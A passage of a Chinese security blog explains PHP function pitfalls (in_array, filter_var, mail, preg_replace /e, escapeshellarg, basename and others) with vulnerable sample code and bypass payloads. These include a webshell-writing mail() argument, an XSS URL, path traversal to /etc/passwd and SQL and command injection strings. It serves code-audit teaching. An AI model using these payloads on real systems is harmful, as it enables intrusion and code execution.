href="#10-in-array" class="headerlink" title="10.in_array"></a>10.in_array</h4><p>语法：in_array(search,array,type)</p><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>search</td><td>必需。规定要在数组搜索的值。</td></tr><tr><td>array</td><td>必需。规定要搜索的数组。</td></tr><tr><td>type</td><td>可选。如果设置该参数为 true，则检查搜索的数据与数组的值的类型是否相同。</td></tr></tbody></table><p>注意：in_array()的第三个参数在默认情况下是false，因此 PHP 会尝试将文件名自动转换为整数再进行判断，导致该判断可被绕过。</p><p>例如如下代码在13 行存在任意文件上传漏洞。 在 12 行代码通过 <code>in_array()</code> 来判断文件名是否为整数，可是未将 <code>in_array()</code> 的第三个参数设置为 true 。<code>in_array()</code>的第三个参数在默认情况下是false，因此 PHP 会尝试将文件名自动转换为整数再进行判断，导致该判断可被绕过。比如使用文件名为 5vulnspy.php 的文件将可以成功通过 <code>in_array($this-&gt;file[&#39;name&#39;], $this-&gt;whitelist)</code> 判断，从而将恶意的 PHP 文件上传到服务器。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">class Challenge &#123;</div><div class="line">    const UPLOAD_DIRECTORY = &apos;./solutions/&apos;;</div><div class="line">    private $file;</div><div class="line">    private $whitelist;</div><div class="line"></div><div class="line">    public function __construct($file) &#123;</div><div class="line">        $this-&gt;file = $file;</div><div class="line">        $this-&gt;whitelist = range(1, 24);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    public function __destruct() &#123;</div><div class="line">        if (in_array($this-&gt;file[&apos;name&apos;], $this-&gt;whitelist)) &#123;</div><div class="line">            move_uploaded_file(</div><div class="line">                $this-&gt;file[&apos;tmp&apos;],</div><div class="line">                self::UPLOAD_DIRECTORY . $this-&gt;file[&apos;name&apos;]</div><div class="line">            );</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">$challenge = new Challenge($_FILES[&apos;solution&apos;]);</div></pre></td></tr></table></figure><p>测试</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$myarray = range(1,24); </div><div class="line">in_array(&apos;5vulnspy.php&apos;,$myarray);         //true</div><div class="line">in_array(&apos;5vulnspy.php&apos;,$myarray,true);    //false</div></pre></td></tr></table></figure><p>注:array_search()与in_array()也是一样的问题。</p><h4 id="11-filter-var"><a href="#11-filter-var" class="headerlink" title="11.filter_var"></a>11.filter_var</h4><p>filter_var()的URL过滤非常的弱，只是单纯的从形式上检测并没有检测协议。测试如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">var_dump(filter_var(&apos;vulnspy.com&apos;, FILTER_VALIDATE_URL));           # false</div><div class="line">var_dump(filter_var(&apos;http://vulnspy.com&apos;, FILTER_VALIDATE_URL));    # http://vulnspy.com</div><div class="line">var_dump(filter_var(&apos;xxxx://vulnspy.com&apos;, FILTER_VALIDATE_URL));    # xxxx://vulnspy.com</div><div class="line">var_dump(filter_var(&apos;http://vulnspy.com&gt;&apos;, FILTER_VALIDATE_URL));   # false</div></pre></td></tr></table></figure><p>这种情况下可以采用如下payload<code>javascript://comment%250aalert(1)</code>来触发XSS</p><p>注：%250a即%0a表示换行符，上面的payload会被换行，并且//表示注释。最终触发后将得到如下形式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">javascript://comment</div><div class="line">alert(1)</div></pre></td></tr></table></figure><h4 id="12-class-exist"><a href="#12-class-exist" class="headerlink" title="12.class_exist"></a>12.class_exist</h4><p>以class_exist()为例的下列函数会在在PHP 5.4以下版本中存在任意文件包含漏洞</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">call_user_func()</div><div class="line">call_user_func_array()</div><div class="line">class_exists()</div><div class="line">class_implements()</div><div class="line">class_parents()</div><div class="line">class_uses()</div><div class="line">get_class_methods()</div><div class="line">get_class_vars()</div><div class="line">get_parent_class()</div><div class="line">interface_exists()</div><div class="line">is_a()</div><div class="line">is_callable()</div><div class="line">is_subclass_of()</div><div class="line">method_exists()</div><div class="line">property_exists()</div><div class="line">spl_autoload_call()</div><div class="line">trait_exists()</div></pre></td></tr></table></figure><p>注：class_exists()会检查是否存在对应的类，当调用class_exists()函数时会触发用户定义的<strong>autoload()函数，用于加载找不到的类(这个特性是因为class_exists函数中的$autoload参数，默认是true造成的)。所以如果我们输入../../../../etc/passwd是，就会调用class_exists()，这样就会触发</strong>autoload(),这样就是一个任意文件包含的漏洞了。</p><p>注: PHP5~5.3(包含5.3版本)版本 之间才可以使用路径穿越符号”../“。</p><p>此外，还存在一个blind xxe的漏洞，由于存在class_exists()，所以我们可以调用PHP的内置函数,并且通过$controller = new $controllerName($data);进行实例化。借助与PHP中的SimpleXMLElement类来完成XXE攻击。</p><p>xxe漏洞实例参考：</p><p><a href="https://blog.ripstech.com/2017/shopware-php-object-instantiation-to-blind-xxe/" target="_blank" rel="external">shopware blind xxe</a></p><p><a href="http://bobao.360.cn/learning/detail/3082.html" target="_blank" rel="external">我是如何黑掉“Pornhub”来寻求乐趣和赢得10000$的奖金</a></p><p>参考：<br><a href="https://stackoverflow.com/questions/3812851/there-is-a-way-to-use-class-exists-and-autoload-without-crash-the-script" target="_blank" rel="external">stackoverflow:class_exists&amp;autoload：</a></p><h4 id="13-mail"><a href="#13-mail" class="headerlink" title="13.mail"></a>13.mail</h4><p>mail()中的第五个参数可以-X的方式写入webshell。</p><p>payload：<code>example@example.com -OQueueDirectory=/tmp -X/var/www/html/rce.php</code></p><p>这个PoC的功能是在Web目录中生成一个PHP webshell。该文件（rce.php）包含受到PHP代码污染的日志信息</p><p>escapeshellarg()和filter_var()不安全的问题参考<a href="https://www.anquanke.com/post/id/86015" target="_blank" rel="external">在PHP应用程序开发中不正当使用mail()函数引发的血案</a></p><p>escapeshellarg和escapeshellcmd联合使用从而造成的安全问题参考<a href="https://paper.seebug.org/164/#" target="_blank" rel="external">PHP escapeshellarg()+escapeshellcmd() 之殇</a></p><h4 id="14-正则表达式可能存在问题"><a href="#14-正则表达式可能存在问题" class="headerlink" title="14.正则表达式可能存在问题"></a>14.正则表达式可能存在问题</h4><p>(1)<br>如本意想将非a-z、.、-、<em>全部替换为空，但是正则表达式写成了`[^a-z.-</em>]`，其中没有对-进行转义，那么-表示一个列表，例如[1-9]表示的数字1到9，但是如果[1-9]表示就是字母1、-和9。所以[^a-z.-_]表示的就是非ascii表中的序号为46至122的字母替换为空。那么此时的../…/就不会被匹配，就可以进行目录穿越，从而造成任意文件删除了。</p><p>(2)在反序列化漏洞中对于<code>preg_match(&#39;/O:\d:/&#39;, $data)</code>这样的正则可以采用在对象长度前添加一个+号，即o:14-&gt;o:+14来进行绕过。</p><p>参考：<a href="http://www.phpbug.cn/archives/32.html" target="_blank" rel="external">php反序列unserialize的一个小特性</a></p><h4 id="15-parse-str"><a href="#15-parse-str" class="headerlink" title="15.parse_str"></a>15.parse_str</h4><p>parse_str()可以在参数可控的情况下可以造成变量覆盖漏洞</p><p>例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$var = parse_url($_SERVER[&apos;HTTP_REFERER&apos;]);</div><div class="line">parse_str($var[&apos;query&apos;]);</div></pre></td></tr></table></figure><h4 id="16-preg-replace"><a href="#16-preg-replace" class="headerlink" title="16.preg_replace"></a>16.preg_replace</h4><p>preg_replace() /e 模式可以执行任意代码，例子如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">header(&quot;Content-Type: text/plain&quot;);</div><div class="line"></div><div class="line">function complexStrtolower($regex, $value) &#123;</div><div class="line">    return preg_replace(</div><div class="line">        &apos;/(&apos; . $regex . &apos;)/ei&apos;,</div><div class="line">        &apos;strtolower(&quot;\\1&quot;)&apos;,</div><div class="line">        $value</div><div class="line">    );</div><div class="line">&#125;</div><div class="line"></div><div class="line">foreach ($_GET as $regex =&gt; $value) &#123;</div><div class="line">    echo complexStrtolower($regex, $value) . &quot;\n&quot;;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>preg_replace的参数含义参考 <a href="http://php.net/manual/zh/function.preg-replace.php" target="_blank" rel="external">PHP手册–preg_replace</a></p><p>在此处我们可以看到有两处的值是我们可以操控的，但是只有在’strtolower(“\1”)’这个位置的参数才可以执行代码，所以关键就在这儿。 \1是具有特殊含义的，在这儿就是就是指定第一个子匹配项,也即${phpinfo()}，进而达到执行代码的目的</p><p>参考文章：</p><p><a href="https://xz.aliyun.com/t/2557" target="_blank" rel="external">深入研究preg_replace与代码执行</a></p><p><a href="http://php.net/manual/zh/regexp.reference.back-references.php" target="_blank" rel="external">后向引用</a></p><p><a href="https://www.cdxy.me/?p=756" target="_blank" rel="external">一个PHP正则相关的“经典漏洞”</a></p><h4 id="17-str-replace"><a href="#17-str-replace" class="headerlink" title="17.str_replace"></a>17.str_replace</h4><p>str_replace()函数是单次替换而不是多次替换，因而可以通过双写敏感词汇过滤，例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">str_replace(&apos;../&apos;, &apos;&apos;, $language);</div><div class="line">//payload:..././或者....//</div></pre></td></tr></table></figure><h4 id="18-header"><a href="#18-header" class="headerlink" title="18.header"></a>18.header</h4><p>使用header()进行跳转的时候没有使用exit()或者是die()，导致后续的代码任然可以执行。如果后面存在危险函数，那么将会触发漏洞。</p><p>例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">extract($_POST);</div><div class="line"></div><div class="line">function goAway() &#123;</div><div class="line">    error_log(&quot;Hacking attempt.&quot;);</div><div class="line">    header(&apos;Location: /error/&apos;);</div><div class="line">&#125;</div><div class="line"></div><div class="line">if (!isset($pi) || !is_numeric($pi)) &#123;</div><div class="line">    goAway();</div><div class="line">&#125;</div><div class="line"></div><div class="line">if (!assert(&quot;(int)$pi == 3&quot;)) &#123;</div><div class="line">    echo &quot;This is not pi.&quot;;</div><div class="line">&#125; else &#123;</div><div class="line">    echo &quot;This might be pi.&quot;;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>此处就可以POST一个<code>pi=phpinfo()</code>来借助assert()函数触发代码执行漏洞</p><h4 id="19-intval"><a href="#19-intval" class="headerlink" title="19.intval"></a>19.intval</h4><p>特性1:</p><p>intval()函数执行成功时返回 变量的10进制值，失败时返回 0。空的 array 返回 0，非空的 array 返回 1。</p><p>特性2:</p><p>整数溢出、向下取整和整形判断存在问题</p><p>(1)整数溢出</p><p>32位系统最大的带符号范围为-2147483648 到 2147483647，64位最大的是 9223372036854775807。因此，在32位系统上 intval(‘1000000000000’) 会返回 2147483647</p><p>(2)向下取整</p><p>intval(10.99999)会返回10，intval和int等取整都是’截断’取整，并不是四舍五入</p><p>(3)intval函数进去取整时，是直到遇上数字或者正负号才开始进行转换，之后在遇到非数字或者结束符号（\0）时结束转换</p><p>特性3:</p><p>intval()函数会忽略’’ ‘\n’、’\r’、’\t’、’\v’、’\0’ ，也就是说intval(“\r\n\t 12”) &gt;&gt; 12</p><h4 id="20-htmlentities"><a href="#20-htmlentities" class="headerlink" title="20.htmlentities"></a>20.htmlentities</h4><p>htmlentities默认情况下不会对单引号进行转义。</p><h4 id="21-addslashes"><a href="#21-addslashes" class="headerlink" title="21.addslashes"></a>21.addslashes</h4><p>在进行了addslashes之后进行了截断，在一些情况下就有可能能够获得一个引号。</p><p>比如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">function sanitizeInput($input, $length = 20) &#123;</div><div class="line">    $input = addslashes($input);</div><div class="line">    if (strlen($input) &gt; $length) &#123;</div><div class="line">        $input = substr($input, 0, $length);</div><div class="line">    &#125;</div><div class="line">    return $input;</div><div class="line">&#125;</div><div class="line">$test = &quot;1234567890123456789&apos;&quot;;</div><div class="line">var_dump(sanitizeInput($test));</div><div class="line"></div><div class="line">//output:1234567890123456789\</div></pre></td></tr></table></figure><p>此处输出的刚好是带有一个\，而’则因为长度限制被截断，从而可以出发SQL注入漏洞</p><h4 id="22-小特性"><a href="#22-小特性" class="headerlink" title="22.小特性"></a>22.小特性</h4><p>(1)php自身在解析请求的时候，如果参数名字中包含空格、.、[这几个字符，会将他们转换成_。但是通过<code>$_SERVER[&#39;REQUEST_URI&#39;]</code>方式获得的参数并不会进行转换。</p><p>(2)$_REQUEST是直接从GET，POST 和 COOKIE中取值，不是他们的引用。即使后续GET，POST 和 COOKIE发生了变化，也不会影响$_REQUEST的结果</p><p>参考：</p><p><a href="https://blog.spoock.com/2018/05/05/request-vuln-analysis/" target="_blank" rel="external">《request导致的安全性问题分析》</a></p><p><a href="https://blog.csdn.net/u011721501/article/details/51824576" target="_blank" rel="external">《PHP的两个特性导致waf绕过注入》</a></p><p>(3)PHP中的<code>&quot;&quot;</code>是可以执行代码的，因而在payload中常采用<code>&quot;&lt;?php phpinfo();&gt;&quot;</code></p><h4 id="23"><a href="#23" class="headerlink" title="23. ++"></a>23. ++</h4><p>PHP中的自增符号++在如下情况中不会有任何意义</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$test=123; echo $test++;  # 123</div></pre></td></tr></table></figure><p>因此像下面代码所示的一样，就可能回产生变量覆盖漏洞</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">foreach ($input as $field =&gt; $count) &#123;</div><div class="line">    $this-&gt;$field = $count++;</div><div class="line">&#125;</div><div class="line">//这里的$count++在此并没有立即对值进行了修改</div></pre></td></tr></table></figure><p>提示：当然如果++$count形式的话，也是可以存在变量覆盖的，因为在进行++操作时会进行隐式类型转换，如果能够转换成功，则会进行加法操作；如果不能转换成功，则将最后一个字符进行加法操作。</p><p>示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">$test = 123; echo ++$test;      // 124</div><div class="line">$test = &apos;123&apos;; echo ++$test;    // 124</div><div class="line">$test = &apos;1ab&apos;; echo ++$test;    // &apos;1ac&apos;</div><div class="line">$test = &apos;ab1&apos;; echo ++$test;    // &apos;ab2&apos;</div><div class="line">$test = &apos;a1b&apos;; echo ++$test;    // &apos;a1c&apos;</div><div class="line">$test =array(2,&apos;name&apos;=&gt;&apos;wyj&apos;); echo ++$test;    //Array123</div><div class="line"></div><div class="line">//所以我们构造shell.php4或者shell.pho这样的，在自增操作后就会变成我们想要的shell.php5或者shell.php</div></pre></td></tr></table></figure><h4 id="24-openssl-verify"><a href="#24-openssl-verify" class="headerlink" title="24.openssl_verify"></a>24.openssl_verify</h4><p>依据openssl_verify()的定义有</p><blockquote><p>如果签名正确返回 1, 签名错误返回 0, 内部发生错误则返回-1.</p></blockquote><p>如果单独采用如下形式的判断就会出现问题，因为if判断只有遇到0或者是false返回的才是false。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">if (openssl_verify($data, $signature, $pub)) &#123;</div><div class="line">    $object = json_decode(base64_decode($data));</div><div class="line">    $this-&gt;loginAsUser($object);</div><div class="line">&#125;</div></pre></td></tr></table></figure><h4 id="25-stripcslashes"><a href="#25-stripcslashes" class="headerlink" title="25.stripcslashes"></a>25.stripcslashes</h4><p>stripcslashes函数</p><blockquote><p>返回反转义后的字符串。可识别类似 C 语言的 \n，\r，… 八进制以及十六进制的描述。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">var_dump(stripcslashes(&apos;0\073\163\154\145\145\160\0405\073&apos;));      // 0;sleep 5;</div></pre></td></tr></table></figure><p>因而对于下面这种形式我们可以采用将命令转换为八进制的形式进行绕过正则判断并触发命令执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">function createThumbnail() &#123;</div><div class="line">    $e = stripcslashes(</div><div class="line">        preg_replace(</div><div class="line">            &apos;/[^0-9\\\]/&apos;,</div><div class="line">            &apos;&apos;,</div><div class="line">            isset($_GET[&apos;size&apos;]) ? $_GET[&apos;size&apos;] : &apos;25&apos;</div><div class="line">        )</div><div class="line">    );</div><div class="line">    system(&quot;/usr/bin/convert &#123;$this-&gt;file&#125; --resize $e</div><div class="line">            ./thumbs/&#123;$this-&gt;file&#125;&quot;);</div><div class="line">&#125;</div></pre></td></tr></table></figure><h4 id="26-set-error-handler"><a href="#26-set-error-handler" class="headerlink" title="26.set_error_handler"></a>26.set_error_handler</h4><p>若错误配置此函数，将会造成信息泄露进而造成漏洞产生，比如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">set_error_handler(function ($no, $str, $file, $line) &#123;</div><div class="line">    throw new ErrorException($str, 0, $no, $file, $line);</div><div class="line">&#125;, E_ALL);</div></pre></td></tr></table></figure><p>这里的设置就相当于</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">error_reporting(E_ALL);</div><div class="line">ini_set(&apos;display_errors&apos;, TRUE);</div><div class="line">ini_set(&apos;display_startup_errors&apos;, TRUE);</div></pre></td></tr></table></figure><p>这种配置将会泄露所有的错误信息</p><h4 id="27-declare与array-walk"><a href="#27-declare与array-walk" class="headerlink" title="27.declare与array_walk"></a>27.declare与array_walk</h4><p>针对PHP7版本</p><p>PHP7中引入了declare(strict_types=1);这种声明方式，在进行函数调用的时候会进行参数类型检查。如果参数类型不匹配则函数不会被调用。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">declare(strict_types=1);</div><div class="line">function addnum(int $a,int $b) &#123;</div><div class="line">    return $a+$b;</div><div class="line">&#125;</div><div class="line">$result = addnum(1,2);</div><div class="line">var_dump($result);              // 输出3</div><div class="line">$result = addnum(&apos;1&apos;,&apos;2&apos;);</div><div class="line">var_dump($result);              //出现Fatal error: Uncaught TypeError，Argument 1 passed to addnum() must be of the type integer, string given,程序出错，参数的数据类型不匹配</div></pre></td></tr></table></figure></p><p>但是通过array_walk()调用的函数会忽略掉严格模式还是按照之前的php的类型转换的方式调用函数。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">declare(strict_types=1);</div><div class="line">function addnum(int &amp;$value) &#123;</div><div class="line">    $value = $value+1;</div><div class="line">&#125;</div><div class="line">$input = array(&apos;3a&apos;,&apos;4b&apos;);</div><div class="line">array_walk($input,addnum);</div><div class="line">var_dump($input);//array(4,5)</div></pre></td></tr></table></figure></p><p>因此利用array_walk()的这种特性，我们可以传入任意字符进去，进而触发相应的漏洞。</p><h4 id="28-ldap-escape"><a href="#28-ldap-escape" class="headerlink" title="28.ldap_escape"></a>28.ldap_escape</h4><blockquote><p><strong>string ldap_escape ( string $value [, string $ignore [, int $flags ]] )</strong></p><p><strong>value</strong></p><p>The value to escape.</p><p><strong>ignore</strong></p><p>Characters to ignore when escaping.</p><p><strong>flags</strong></p><p>The context the escaped string will be used in: LDAP_ESCAPE_FILTER for filters to be used with ldap_search(), or LDAP_ESCAPE_DN for DNs.</p></blockquote><p>当使用ldap_search()时需要选择LDAP_ESCAPE_FILTER过滤字符串，但是如果选择LDAP_ESCAPE_DN将会导致过滤无效</p><h4 id="29-strip-tags-amp-amp-preg-replace"><a href="#29-strip-tags-amp-amp-preg-replace" class="headerlink" title="29.strip_tags &amp;&amp; preg_replace"></a>29.strip_tags &amp;&amp; preg_replace</h4><p>例如:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$textMsg = trim(strip_tags(preg_replace(&apos;/&lt;(head|title|style|script)[^&gt;]*&gt;.*?&lt;\/\\1&gt;/s&apos;，&apos;&apos;，$message)));</div></pre></td></tr></table></figure><p>目的很明显–去掉所有的标签和内容。首先使用<code>preg_replace</code>过滤掉标签、标签内容、标签属性，接着又使<code>用strip_tags</code>去掉其余的html和php标记。</p><p>正常输入没问题–如:<code>&lt;head&gt;evil&lt;/head&gt;</code>，得到的结果是空，即全部都被过滤了。</p><p>结果很悲惨–如果攻击者输入<code>&lt;head&gt;evil&lt;/headend&gt;</code>或者<code>&lt;he&lt;&gt;ad&gt;evil&lt;/head&gt;</code>之类，就会导致evil字符串逃逸，攻击者利用evil字符串再结合上下文说不定就能够造成漏洞。</p><h4 id="30-escapeshellarg-amp-amp-escapeshellcmd"><a href="#30-escapeshellarg-amp-amp-escapeshellcmd" class="headerlink" title="30.escapeshellarg &amp;&amp; escapeshellcmd"></a>30.escapeshellarg &amp;&amp; escapeshellcmd</h4><blockquote><p>escapeshellarg 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号</p><p>escapeshellcmd 会对&amp;#;|*?~&lt;&gt;^()[]{}$\， \x0A 和 \xFF进行转义，’和 “仅在不配对儿的时候被转义</p></blockquote><p>需要注意的是escapeshellarg和escapeshellcmd在win平台和linux平台的表现是不一样的。他们两者造成的漏洞也主要是在Linux平台下。接下来主要是说明在Linux平台下的情况</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$msg = &quot;123&apos;456&quot;;</div><div class="line">echo escapeshellarg($msg)  // 结果是： &apos;123&apos;\&apos;&apos;456&apos;</div><div class="line">echo escapeshellcmd($msg)  // 结果是: 123\&apos;456</div></pre></td></tr></table></figure><p>当两者混合使用时，就会出现问题。代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$parameter1 = escapeshellarg($parameter)</div><div class="line">$parameter2 = escapeshellcmd($parameter1)</div><div class="line">system(&quot;curl &quot;.$parameter2)</div></pre></td></tr></table></figure><p>假设我们传入的$parameter为<code>172.17.0.2&#39; -v -d a=1</code>，那么经过escapeshellarg之后变为<code>&#39;172.17.0.2&#39;\&#39;&#39; -v -d a=1&#39;</code>。之后经过escapeshellcmd变为<code>&#39;172.17.0.2&#39;\\&#39;&#39; -v -d a=1\&#39;</code>，此时\的存在后面得’不会被转义，所以后面的两个’’变为了空白字符。那么最后实际的命令为<code>curl 172.17.0.2\ -v -d a=1&#39;</code>，成功地逃逸了单引号。</p><p>这两个函数联合使用之后可以造成单引号逃逸，这样就很有可能会造成漏洞，利用的方式就需要看具体的应用场景了。</p><h4 id="31-addslashes-amp-amp-basename"><a href="#31-addslashes-amp-amp-basename" class="headerlink" title="31.addslashes &amp;&amp; basename"></a>31.addslashes &amp;&amp; basename</h4><p>basename的主要用法是：</p><blockquote><p>给出一个包含有指向一个文件的全路径的字符串，basename()函数返回基本的文件名。如果是在windows环境下，路径中的斜线(/)和反斜线()都可以用作目录分割符，在其他环境下是斜线(/)</p></blockquote><p>示例:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">在 win平台下</div><div class="line">$mypath1 = &apos;C:/Users/monkey/1.txt&apos;;</div><div class="line">$name1 = basename($mypath1);</div><div class="line">var_dump($name1);       // 1.txt</div><div class="line">$mypath2 = &apos;C:\Users\monkey\2.txt&apos;;</div><div class="line">$name2 = basename($mypath2);</div><div class="line">var_dump($name2);       // 2.txt</div><div class="line"></div><div class="line">在Linux平台下</div><div class="line">$mypath1 = &apos;C:/Users/monkey/1.txt&apos;;</div><div class="line">$name1 = basename($mypath1);</div><div class="line">var_dump($name1);       // 1.txt</div><div class="line">$mypath2 = &apos;C:\Users\monkey\2.txt&apos;;</div><div class="line">$name2 = basename($mypath2);</div><div class="line">var_dump($name2);       // C:\Users\monkey\2.txt</div></pre></td></tr></table></figure></p><p>注:</p><ol><li>不一定是需要addslashes，只需要是进行了转义即可</li><li>此方式的利用需要在win平台下。因为在win平台下，\/都可以作为basename的分隔符，但是在Linux平台下只有/可以作为分隔符，而addslashes会增加一个\。所以只能在win平台下使用。</li></ol><p>漏洞演示如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">$filename = &quot;123&apos;456.png&quot;;</div><div class="line">$filename = addslashes($filename);</div><div class="line">var_dump($filename);        //结果是 123\&apos;456.png</div><div class="line">$filename = basename($filename);</div><div class="line">var_dump($filename);        // 结果是 &apos;456.png</div></pre></td></tr></table></figure></p><p>通过例子可以看到，成功地逃逸了反斜线，单引号也保留了。<br>如果存在如下的代码:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">// 对输入进行转义</div><div class="line">if (!@ get_magic_quotes_gpc()) &#123;</div><div class="line">    $_GET = $_GET ? $this-&gt;addslashes_deep($_GET) : &apos;&apos;;</div><div class="line">    $_POST = $_POST ? $this-&gt;addslashes_deep($_POST) : &apos;&apos;;</div><div class="line">    $_COOKIE = $this-&gt;addslashes_deep($_COOKIE);</div><div class="line">    $_REQUEST = $this-&gt;addslashes_deep($_REQUEST);</div><div class="line">&#125;</div><div class="line"></div><div class="line">$imagename = basename($_POST[&apos;image&apos;]);</div><div class="line">$sql = &quot;UPDATE table SET image = &apos;&quot;.$imagename.&quot;&apos;where id=1&quot;;</div><div class="line">query($sql);</div></pre></td></tr></table></figure><p>此时，如果我们输入的image的参数为<code>123&#39; and if(1.sleep(3)，0)#</code>，最后的imagename的值为<code>&#39; and if(1.sleep(3)，0)#</code>，sql语句为<code>UPDATE table SET image = &#39;&#39; or if(1.sleep(3)，0)#&#39;where id=1</code>形成了一个盲注。</p><h4 id="32-explode-amp-amp-preg-replace"><a href="#32-explode-amp-amp-preg-replace" class="headerlink" title="32.explode &amp;&amp; preg_replace"></a>32.explode &amp;&amp; preg_replace</h4><p>注:这种漏洞常见于文件上传</p><p>explode()用法:</p><blockquote><p>array explode ( string $delimiter ， string $string [， int $limit ] )，此函数返回由字符串组成的数组，每个元素都是 string 的一个子串，它们被字符串 delimiter 作为边界点分割出来。</p></blockquote><p>示例:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$pizza  = &quot;piece1 piece2 piece3 piece4 piece5 piece6&quot;;</div><div class="line">$pieces = explode(&quot; &quot;， $pizza);         // 